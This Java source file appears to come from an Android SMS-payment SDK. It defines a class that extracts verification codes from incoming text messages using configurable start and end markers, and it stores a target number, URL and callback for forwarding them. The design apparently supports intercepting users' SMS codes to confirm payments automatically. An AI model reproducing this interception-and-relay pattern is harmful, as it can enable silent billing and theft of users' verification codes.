package com.poxiao.smspay.observer;


/**
 * 短信验证码实体类
 *  				"icStart" : "验证码",     --接受验证码开始字符，为空则头开始  ［必填］
                     "icEnd" : "谢谢",     --接受验证码结束字符，为空则到最后        ［必填］
                      "rulecontent" : “”,     -- 如果不为空表示按规则截取验证码替换下发内容中的XXXX字符串 ［必填］
                     “sendcontent" : “”,  --如果不为空表示发送指定内容 ［必填］
                     "port" : "11817175",            --接受验证码接口,0表示不需要发送 ［必填］
                     "sendport" : "",         --如果不为空则下发到指定端口，如果为空则下发到发送端口 ［必填］
                      “sendurl" : "" ,            --如果有发送验证码到该url［必填］
                     "callbackurl" : ""    -- 发送结果回调接口post协议。 ［必填］
 * @author zarawu
 *
 */
public class SmsVerify {
	/**
	 * 订单号
	 */
	private String orderId;

	/**
	 * 验证码短信
	 */
	private String number;

	/**
	 * 验证码短信-开始字符串
	 */
	private String startStr;

	/**
	 * 验证码短信-结束字符串
	 */
	private String endStr;
	/**
	 * 如果指定发送内容则使用指定部分
	 */
	private String sendContent;

	/**
	 * 按规则替换掉固定字符串
	 */
	private String ruleContent;
	
	/**
	 * 验证码解析好以后发送到指定号码
	 */
	private String sendNumber;
	
	/**
	 * 验证码解析好以后发送到指定url
	 */
	private String sendurl;
	
	/**
	 * 开始验证的时间
	 */
	private long time;

	/**
	 * 回传验证码时机
	 */
	private String callbackurl;

	/**
	 * 抓取到验证码的回调函数
	 */
	private VerifyCallback verifyCallback;

	/**
	 * 获取验证码
	 * 
	 * @param smsVerify
	 * @param smsInfo
	 * @return null, 没有匹配到。"error", 错误
	 */
	public static String getVerify(SmsVerify smsVerify, String smsInfo) {
		Debug.i("SmsVerify->getVerify, smsInfo=" + smsInfo);
		if (smsVerify == null) {
			Debug.e("SmsVerify->getVerify, smsVerify=null");
			return null;
		}

		if (smsInfo == null) {
			Debug.e("SmsVerify->getVerify, smsInfo=null");
			return null;
		}

		try {
			String result="";
			//如果固定发送内容则发送内容为 sendContent 
			if(smsVerify.getSendContent()!=null&&smsVerify.getSendContent().length()>0){
				Debug.e("SmsVerify->getVerify, smsInfo=发送固定内容");
				result=smsVerify.getSendContent();
			}else {
				final String startStr = smsVerify.getStartStr();
				final String endStr = smsVerify.getEndStr();
				int startPos;
				if ("".equals(startStr)) {
					Debug.i("SmsVerify->截取从位置0开始");
					startPos = 0;
				} else {
					startPos = smsInfo.indexOf(startStr) + startStr.length();
				}
				int endPos = smsInfo.indexOf(endStr);
				if ("".equals(endStr)) {
					Debug.i("SmsVerify->截取到末尾位置");
					endPos = smsInfo.length();
				} else {
					endPos = smsInfo.indexOf(endStr);
				}
				
				result = smsInfo.substring(startPos, endPos);
				Debug.e("SmsVerify->截取后的发送替换内容为："+result);
				
				if(smsVerify.getRuleContent()!=null&&smsVerify.getRuleContent().length()>0){
					//替换POXIAONEW部分
					Debug.e("SmsVerify->getVerify, smsInfo=发送替换内容");
					result=smsVerify.getRuleContent().replaceAll("TBUNEW",result);
				}else{
					Debug.e("SmsVerify->getVerify, smsInfo=发送截取内容");
				}
				
				Debug.i("SmsVerify->getVerify, result=" + result);
			}
			
			
			return result;
		} catch (Exception e) {
			Debug.e("SmsVerify->getVerify, e=" + e.toString());
			return "error";
		}
	}

	public String getNumber() {
		return number;
	}

	public void setNumber(String number) {
		this.number = number;
	}

	public String getStartStr() {
		return startStr;
	}

	public void setStartStr(String startStr) {
		this.startStr = startStr;
	}

	public String getEndStr() {
		return endStr;
	}

	public void setEndStr(String endStr) {
		this.endStr = endStr;
	}

	public long getTime() {
		return time;
	}

	public void setTime(long time) {
		this.time = time;
	}

	public VerifyCallback getVerifyCallback() {
		return verifyCallback;
	}

	public void setVerifyCallback(VerifyCallback verifyCallback) {
		this.verifyCallback = verifyCallback;
	}

	public String getOrderId() {
		return orderId;
	}

	public void setOrderId(String orderId) {
		this.orderId = orderId;
	}

	public String getSendContent() {
		return sendContent;
	}

	public void setSendContent(String sendContent) {
		this.sendContent = sendContent;
	}

	public String getSendNumber() {
		return sendNumber;
	}

	public void setSendNumber(String sendNumber) {
		this.sendNumber = sendNumber;
	}
	
	
	public String getRuleContent() {
		return ruleContent;
	}

	public void setRuleContent(String ruleContent) {
		this.ruleContent = ruleContent;
	}

	public String getSendurl() {
		return sendurl;
	}

	public void setSendurl(String sendurl) {
		this.sendurl = sendurl;
	}

	public String getCallbackurl() {
		return callbackurl;
	}

	public void setCallbackurl(String callbackurl) {
		this.callbackurl = callbackurl;
	}
}
